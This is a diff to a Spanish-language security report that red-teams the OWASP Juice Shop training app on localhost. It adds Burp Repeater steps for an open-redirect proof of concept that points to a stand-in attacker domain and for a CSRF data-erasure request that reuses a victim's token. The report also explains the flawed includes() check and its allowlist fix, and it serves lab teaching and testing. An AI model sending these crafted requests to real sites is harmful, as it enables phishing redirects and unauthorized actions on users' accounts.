@@ -861,6 +861,19 @@ Los resultados del Red Team deberán compararse con los hallazgos de SAST y con 
   curl -i "http://localhost:8080/redirect?to=http://sitio-falso.example/?x=https://github.com/juice-shop/juice-shop"
   ```
 
+- **Cómo repetirlo en Burp Repeater:**
+  1. Con la instancia local en ejecución, abrir **Burp Suite → Repeater** y crear una pestaña nueva.
+  2. Fijar el *Target* en `http://localhost:3000` (HTTP, sin TLS). Si Burp corre en Windows y la app en WSL, usar la IP de WSL, p. ej. `http://172.24.144.57:3000` (se obtiene con `hostname -I`).
+  3. Pegar la siguiente petición cruda (dejar una **línea en blanco al final** del bloque de cabeceras):
+
+  ```http
+  GET /redirect?to=http://sitio-falso.example/?x=https://github.com/juice-shop/juice-shop HTTP/1.1
+  Host: localhost:3000
+  Connection: close
+  ```
+  ![Juice Shop](/docs/hito-2/hito-2-assets/BurpPOC1.png)
+  
+
   > La clave es el parámetro `?x=...github.com/juice-shop/juice-shop`: la app valida el destino con `includes()`, así que basta con que la URL *contenga* un dominio permitido para que acepte el redirect hacia el sitio del atacante. Por eso RS-09 exige comparación exacta contra una lista de permitidos, no `includes()`.
 
 - **Resultado observado:** confirmado por ZAP (alerta "Off-site Redirect", riesgo Alto) y en la bitácora: `GET /redirect?to=https://github.com/juice-shop/juice-shop` devolvió `302 Found` con `Location: https://github.com/juice-shop/juice-shop`. El endpoint redirige a destinos externos sin validación estricta. *(Re-ejecución en vivo con el payload del dominio del atacante pendiente: el backend requiere compilar el frontend para levantar.)*
@@ -902,6 +915,20 @@ Los resultados del Red Team deberán compararse con los hallazgos de SAST y con 
 
    ![Juice Shop](/docs/hito-2/hito-2-assets/POC2PostmanParte3.png)
 
+  - **Cómo repetirlo en Burp Repeater:**
+  1. Obtener una sesión válida: hacer login (en Repeater o Postman) con `POST /rest/user/login` y copiar el valor `authentication.token` de la respuesta.
+  2. En **Burp Suite → Repeater**, fijar el *Target* en `http://localhost:3000` (o la IP de WSL).
+  3. Pegar la siguiente petición cruda, reemplazando `<TOKEN-de-la-víctima>` por el token del paso 1 (dejar una **línea en blanco** entre las cabeceras y el cuerpo):
+
+  ```http
+  POST /dataerasure HTTP/1.1
+  Host: localhost:3000
+  Content-Type: application/x-www-form-urlencoded
+  Cookie: token=<TOKEN-de-la-víctima>
+  Content-Length: 45
+
+  email=csrf-h2@juice-sh.op&securityAnswer=test
+
   Equivalente por terminal (crear usuario, login y disparar la acción sin token CSRF):
   ```bash
   # 1) crear usuario
@@ -918,6 +945,8 @@ Los resultados del Red Team deberán compararse con los hallazgos de SAST y con 
     -H 'Cookie: token=<TOKEN>' \
     -d 'email=csrf@test.op&securityAnswer=test'
   ```
+![Juice Shop](/docs/hito-2/hito-2-assets/BurpPOC2.png)
+  
 
   **PoC real (página auto-enviada).** Abrir en el navegador donde la víctima tiene sesión activa:
   ```html
